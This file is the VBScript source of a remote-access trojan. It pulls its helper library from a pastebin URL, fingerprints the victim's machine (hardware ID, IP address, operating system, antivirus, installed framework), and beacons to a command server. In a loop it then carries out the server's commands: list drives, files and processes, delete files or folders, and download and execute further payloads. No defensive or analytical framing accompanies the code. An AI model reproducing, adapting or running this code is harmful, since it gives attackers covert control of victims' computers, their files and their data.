on error resume next 
set rakan = getobject("script:https://pastebin.com/raw/DUe3WKKw")
set shell = createObject("wscript.shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

	Set args = Wscript.Arguments
	argsFound = false
	For Each arg In args
		argsFound = arg
	Next
	if argsFound = false then
		rakan.runSelf rakan.genRndStr(8),WScript.FullName,args,WScript.ScriptFullName
	Else
		mutex = argsFound
	end if 
	rakan.killPastInstances mutex,WScript.ScriptFullName 

spliter = "<>"
sUrl = "http://127.0.0.1:4562"
timestamp = CStr(DateDiff("s", "01/01/1970 00:00:00", CDate(Now)))
HWIDf = rakan.HWIDf()
Dim arr
arr = Array("<EOF>","w",HWIDf,"rakan_random",rakan.IPAdress(),rakan.GetOs(),rakan.GetAV(),CStr(rakan.InstallDateFunc(WScript.ScriptFullName)),rakan.MaxFrameworkVersionCheck())
Dim sRequest

for each A in arr
sRequest = + sRequest + A + spliter 
next
while true
respond = Split(rakan.HTTPPost(sUrl, sRequest + CStr(DateDiff("s", "01/01/1970 00:00:00", CDate(Now)))),"<<>>")
select case respond(2)
case "msgbox"
msgbox respond(3)
rakan.HTTPPost sUrl,"<EOF><>rc<>" + HWIDf + "<>" + respond(1) 
case "getDrivers"
drivers = rakan.GetHardDirve
rakan.HTTPPost sUrl,"<EOF><>hdi<>" & drivers & "<>" & HWIDf
rakan.HTTPPost sUrl,"<EOF><>rc<>" + HWIDf + "<>" + respond(1) 
case "getfilesandd"
rakan.HTTPPost sUrl,"<EOF><>fdi<>" & rakan.GetFilesAndFolders(respond(3)) & "<>" & HWIDf
rakan.HTTPPost sUrl,"<EOF><>rc<>" + HWIDf + "<>" + respond(1) 
case "deletefileorfolder"
objFSO.deletefile respond(3)
objFSO.deletefolder respond(3)
rakan.HTTPPost sUrl,"<EOF><>rc<>" + HWIDf + "<>" + respond(1) 
case "processlist"
rakan.HTTPPost sUrl,"<EOF><>prccl<>" & rakan.enumprocess & "<>" & HWIDf
rakan.HTTPPost sUrl,"<EOF><>rc<>" + HWIDf + "<>" + respond(1) 
case "dowwwnexec"
rakan.var6 respond(3),respond(4)
rakan.HTTPPost sUrl,"<EOF><>rc<>" + HWIDf + "<>" + respond(1) 
end select
wscript.sleep 1000
wend


